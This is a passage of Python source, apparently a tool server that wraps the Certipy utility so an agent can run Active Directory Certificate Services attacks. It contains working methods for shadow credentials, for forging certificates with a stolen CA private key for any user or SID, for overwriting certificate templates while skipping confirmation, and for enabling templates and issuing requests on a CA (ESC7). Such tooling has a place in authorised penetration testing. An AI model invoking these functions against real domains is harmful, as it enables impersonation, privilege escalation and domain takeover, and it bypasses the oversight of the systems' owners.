            if ccache_files:
                self._save_ticket(account, ccache_files[0])

            # Detect certipy errors
            certipy_error = self._detect_certipy_error(combined)
            is_success = certipy_error is None

            return ToolResult(
                success=is_success,
                data={
                    "method": "shadow",
                    "action": action,
                    "account": account,
                    "nt_hash": parsed["nt_hash"],
                    "pfx_path": parsed["pfx_path"],
                    "device_id": parsed["device_id"],
                    "key_credentials": parsed["key_credentials"],
                    "output_files": new_files,
                },
                raw_output=sanitize_output(combined),
                error=certipy_error if not is_success else None,
            )
        except Exception as e:
            return ToolResult(success=False, error=str(e), raw_output=sanitize_output(combined))

    async def forge(
        self,
        ca_pfx: str,
        ca_password: Optional[str] = None,
        upn: Optional[str] = None,
        dns: Optional[str] = None,
        sid: Optional[str] = None,
        subject: Optional[str] = None,
        crl: Optional[str] = None,
        serial: Optional[str] = None,
        key_size: int = 2048,
        validity_period: int = 365,
        timeout: int = 120,
    ) -> ToolResult:
        """Forge certificates using compromised CA private key."""
        if not os.path.isfile(ca_pfx):
            return ToolResult(
                success=False,
                error=f"CA PFX file not found: {ca_pfx}",
            )

        if not upn and not dns and not subject:
            return ToolResult(
                success=False,
                error="Must specify at least one of: upn, dns, or subject for the forged certificate.",
            )

        self._ensure_work_dir()
        prefix = self._unique_prefix()
        before = self._snapshot_files()

        cmd = [CERTIPY_BIN, "forge", "-ca-pfx", ca_pfx]

        # Output path — just filename, certipy replaces / with _ in paths
        target_name = (upn or dns or "forged").replace("@", "_").replace(".", "_")
        out_name = f"{prefix}_{target_name}"
        cmd.extend(["-out", f"{out_name}.pfx"])

        if ca_password:
            cmd.extend(["-ca-password", ca_password])
        if upn:
            cmd.extend(["-upn", upn])
        if dns:
            cmd.extend(["-dns", dns])
        if sid:
            cmd.extend(["-sid", sid])
        if subject:
            cmd.extend(["-subject", subject])
        if crl:
            cmd.extend(["-crl", crl])
        if serial:
            cmd.extend(["-serial", serial])
        if key_size != 2048:
            cmd.extend(["-key-size", str(key_size)])
        if validity_period != 365:
            cmd.extend(["-validity-period", str(validity_period)])

        combined = ""
        try:
            result = await self.run_command(cmd, timeout=timeout)
            combined = result.stdout + result.stderr

            new_files = self._find_new_files(before)
            pfx_files = [f for f in new_files if f.endswith(".pfx")]

            return ToolResult(
                success=len(pfx_files) > 0,
                data={
                    "method": "forge",
                    "pfx_path": pfx_files[0] if pfx_files else None,
                    "upn": upn,
                    "dns": dns,
                    "subject": subject,
                    "validity_days": validity_period,
                    "output_files": new_files,
                },
                raw_output=sanitize_output(combined),
                error="No forged PFX file generated — check CA PFX validity"
                if not pfx_files else None,
            )
        except Exception as e:
            return ToolResult(success=False, error=str(e), raw_output=sanitize_output(combined))

    async def template(
        self,
        username: str,
        dc_ip: str,
        template: str,
        action: str = "read",
        password: Optional[str] = None,
        hashes: Optional[str] = None,
        kerberos: bool = False,
        aes_key: Optional[str] = None,
        ccache_path: Optional[str] = None,
        ns: Optional[str] = None,
        dns_tcp: bool = True,
        target: Optional[str] = None,
        config_path: Optional[str] = None,
        timeout: int = 300,
    ) -> ToolResult:
        """View or modify certificate template configuration."""
        if not password and not hashes and not kerberos and not aes_key:
            return ToolResult(
                success=False,
                error="No credentials provided. Supply password, hashes, aes_key, or kerberos=true.",
            )

        if action == "write_config" and not config_path:
            return ToolResult(
                success=False,
                error="config_path is required for 'write_config' action.",
            )

        self._ensure_work_dir()
        prefix = self._unique_prefix()
        before = self._snapshot_files()

        cmd = [CERTIPY_BIN, "template"]
        cmd.extend(self._build_auth_args(
            username=username, dc_ip=dc_ip, password=password,
            hashes=hashes, kerberos=kerberos, aes_key=aes_key,
            ns=ns, dns_tcp=dns_tcp, target=target,
        ))

        cmd.extend(["-template", template])

        if action == "save_config":
            save_name = f"{prefix}_{template}.json"
            cmd.extend(["-save-configuration", save_name])
        elif action == "write_default":
            cmd.append("-write-default-configuration")
            cmd.append("-force")  # Skip confirmation prompt
        elif action == "write_config":
            cmd.extend(["-write-configuration", config_path])
            cmd.append("-force")  # Skip confirmation prompt

        auth_env = self._get_auth_env(ccache_path=ccache_path) if kerberos else {}
        combined = ""
        try:
            result = await self.run_command(cmd, timeout=timeout, env=auth_env)
            combined = result.stdout + result.stderr

            new_files = self._find_new_files(before)
            json_files = [f for f in new_files if f.endswith(".json")]

            data = {
                "method": "template",
                "template": template,
                "action": action,
                "output_files": new_files,
            }

            # Parse saved config if available
            if json_files:
                try:
                    with open(json_files[0], "r") as f:
                        config = json.load(f)
                    data["config"] = config
                    data["config_path"] = json_files[0]
                except (json.JSONDecodeError, OSError):
                    data["config_path"] = json_files[0]

            # Detect certipy errors
            certipy_error = self._detect_certipy_error(combined)

            # Additional heuristic: if save_config produced no JSON file, or
            # if the output is just the certipy banner (silent failure on auth),
            # treat as failure. Certipy sometimes exits 0 with no error message.
            if certipy_error is None and action == "save_config" and not json_files:
                certipy_error = "No configuration saved — certipy may have failed silently. Check credentials and template name."
            elif certipy_error is None and action == "read":
                # Strip the banner to check for actual template content
                stripped = re.sub(r"Certipy v[\d.]+ - by Oliver Lyak \(ly4k\)\s*", "", combined).strip()
                if not stripped:
                    certipy_error = "No template data returned — certipy may have failed silently. Check credentials and template name."

            is_success = certipy_error is None

            return ToolResult(
                success=is_success,
                data=data,
                raw_output=sanitize_output(combined),
                error=certipy_error if not is_success else None,
            )
        except Exception as e:
            return ToolResult(success=False, error=str(e), raw_output=sanitize_output(combined))


    async def ca(
        self,
        username: str,
        dc_ip: str,
        ca_name: str,
        enable_template: Optional[str] = None,
        disable_template: Optional[str] = None,
        issue_request: Optional[int] = None,
        deny_request: Optional[int] = None,
        password: Optional[str] = None,
        hashes: Optional[str] = None,
        kerberos: bool = False,
        aes_key: Optional[str] = None,
        ccache_path: Optional[str] = None,
        ns: Optional[str] = None,
        dns_tcp: bool = True,
        target: Optional[str] = None,
        timeout: int = 300,
    ) -> ToolResult:
        """Manage Certificate Authority: enable/disable templates, approve/deny requests (ESC7)."""
        if not password and not hashes and not kerberos and not aes_key:
            return ToolResult(
                success=False,
                error="No credentials provided. Supply password, hashes, aes_key, or kerberos=true.",
            )

        self._ensure_work_dir()

        cmd = [CERTIPY_BIN, "ca"]
        cmd.extend(self._build_auth_args(
            username=username, dc_ip=dc_ip, password=password,
            hashes=hashes, kerberos=kerberos, aes_key=aes_key,
            ns=ns, dns_tcp=dns_tcp, target=target,
        ))

        cmd.extend(["-ca", ca_name])

        action_desc = "unknown"
        if enable_template:
            cmd.extend(["-enable-template", enable_template])
            action_desc = f"enable template '{enable_template}'"
        elif disable_template:
            cmd.extend(["-disable-template", disable_template])
            action_desc = f"disable template '{disable_template}'"
        elif issue_request is not None:
            cmd.extend(["-issue-request", str(issue_request)])
            action_desc = f"issue request {issue_request}"
        elif deny_request is not None:
            cmd.extend(["-deny-request", str(deny_request)])
            action_desc = f"deny request {deny_request}"

        auth_env = self._get_auth_env(ccache_path=ccache_path) if kerberos else {}
        combined = ""
        try:
            result = await self.run_command(cmd, timeout=timeout, env=auth_env)
            combined = result.stdout + result.stderr

            certipy_error = self._detect_certipy_error(combined)

            # Check for success indicators in output
            success_indicators = [
                "Successfully enabled",
                "Successfully disabled",
                "Successfully issued",
                "Successfully denied",
                "approved",
            ]
            has_success = any(ind.lower() in combined.lower() for ind in success_indicators)
            is_success = (certipy_error is None and result.returncode == 0) or has_success

            return ToolResult(
                success=is_success,
                data={
                    "method": "ca",
                    "ca_name": ca_name,
                    "action": action_desc,
                    "enable_template": enable_template,
                    "disable_template": disable_template,
                    "issue_request": issue_request,
                    "deny_request": deny_request,
                },
                raw_output=sanitize_output(combined),
                error=certipy_error if not is_success else None,
            )
        except Exception as e:
            return ToolResult(success=False, error=str(e), raw_output=sanitize_output(combined))


if __name__ == "__main__":
    CertipyServer.main()
